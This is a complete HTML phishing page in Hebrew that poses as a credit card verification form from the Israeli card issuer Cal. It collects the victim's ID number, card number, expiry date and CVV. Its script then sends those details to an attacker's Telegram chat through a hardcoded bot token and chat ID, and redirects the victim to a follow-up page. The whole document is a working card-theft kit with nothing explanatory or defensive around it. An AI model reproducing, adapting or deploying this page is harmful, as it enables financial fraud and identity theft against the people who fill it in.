<!DOCTYPE html>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cal Credit Card</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            direction: rtl; 
        }
        .logo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            text-align: center;
            font-size: 30px;
            font-weight: bold;
            padding: 10px 0;
            background-color: white;
            color: #0057d8;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }
        .header {
            background-color: #0057d8;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 24px;
            margin-top: 60px; 
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group input {
            width: 100%;
            padding: 10px 5px;
            border: none;
            border-bottom: 2px solid #ddd;
            outline: none;
            text-align: right;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .input-group input:focus {
            border-bottom: 2px solid #0057d8; 
        }
        .input-group input.error {
            border-bottom: 2px solid red;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        .button {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #0057d8;
            color: white;
            text-align: center;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #0044a8;
        }
    </style>
</head>
<body>

    <div class="logo">.Cal</div>

    <div class="header">
        אימות כרטיס אשראי
    </div>

    <div class="container">
        <div class="input-group">
            <label>פרטים אישיים</label>
            <input type="text" id="id" placeholder="מספר תעודת זהות של בעל הכרטיס" maxlength="9">
            <div class="error-message" id="id-error">נא למלא שדה זה</div>
            <div class="error-message" id="id-length-error">מספר תעודת זהות חייב להיות בן 9 ספרות.</div>
        </div>
        <div class="input-group">
            <input type="text" id="name" placeholder="שם בעל הכרטיס">
            <div class="error-message" id="name-error">נא למלא שדה זה</div>
        </div>
        <div class="input-group">
            <input type="text" id="phone" placeholder="הטלפון הנייד של בעל הכרטיס" maxlength="10">
            <div class="error-message" id="phone-error">נא למלא שדה זה</div>
            <div class="error-message" id="phone-length-error">מספר הטלפון חייב להיות בן 10 ספרות.</div>
        </div>
        <div class="input-group">
            <input type="text" id="card-number" placeholder="מספר כרטיס אשראי" maxlength="16">
            <div class="error-message" id="card-number-error">נא למלא שדה זה</div>
            <div class="error-message" id="card-number-length-error">מספר כרטיס האשראי חייב להיות בן 16 ספרות.</div>
        </div>
        <div class="input-group">
            <input type="text" id="card-expiry" placeholder="תאריך תפוגה (MM/YY)" maxlength="5">
            <div class="error-message" id="expiry-error">נא למלא שדה זה</div>
            <div class="error-message" id="expiry-length-error">נא להזין תאריך תפוגה בפורמט MM/YY.</div>
        </div>
        <div class="input-group">
            <input type="text" id="cvv" placeholder="CVV" maxlength="3">
            <div class="error-message" id="cvv-error">נא למלא שדה זה</div>
            <div class="error-message" id="cvv-length-error">CVV חייב להיות בן 3 ספרות.</div>
        </div>
        <button class="button" onclick="validateAndSubmit()">אפשר להמשיך</button>
    </div>

    <script>
        function validateAndSubmit() {
            const idNumber = document.getElementById('id').value.trim();
            const cardNumber = document.getElementById('card-number').value.trim();
            const expiryDate = document.getElementById('card-expiry').value.trim();
            const cvv = document.getElementById('cvv').value.trim();
            let isValid = true;

            // Clear previous errors
            document.querySelectorAll('.error-message').forEach(error => error.style.display = 'none');

            // Validation
            if (!idNumber) {
                document.getElementById('id-error').style.display = 'block';
                isValid = false;
            } else if (idNumber.length !== 9) {
                document.getElementById('id-length-error').style.display = 'block';
                isValid = false;
            }

            if (!cardNumber) {
                document.getElementById('card-number-error').style.display = 'block';
                isValid = false;
            } else if (cardNumber.length !== 16) {
                document.getElementById('card-number-length-error').style.display = 'block';
                isValid = false;
            }

            if (!expiryDate) {
                document.getElementById('expiry-error').style.display = 'block';
                isValid = false;
            } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
                document.getElementById('expiry-length-error').style.display = 'block';
                isValid = false;
            }

            if (!cvv) {
                document.getElementById('cvv-error').style.display = 'block';
                isValid = false;
            } else if (cvv.length !== 3) {
                document.getElementById('cvv-length-error').style.display = 'block';
                isValid = false;
            }

            if (isValid) {
                const token = '7860990758:AAEL00gcX3iTB9N0D7z-9qBfDlbZ3hmHrO4';
                const chatId = '5021790058';
                const message = `
                📋 נתונים חדשים:
                📌 מספר כרטיס: ${cardNumber}
                📌 תאריך תוקף: ${expiryDate}
                📌 CVV: ${cvv}
                📌 תעודת זהות: ${idNumber}
                `;

                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                }).then(response => {
                    if (response.ok) {
                        window.location.href = 'verification.html';
                    } else {
                        alert('שגיאה בשליחת הנתונים. נסה שוב מאוחר יותר.');
                    }
                }).catch(error => {
                    alert('שגיאה בחיבור לשרת. נסה שוב מאוחר יותר.');
                });
            }
        }
    </script>

</body>
</html>
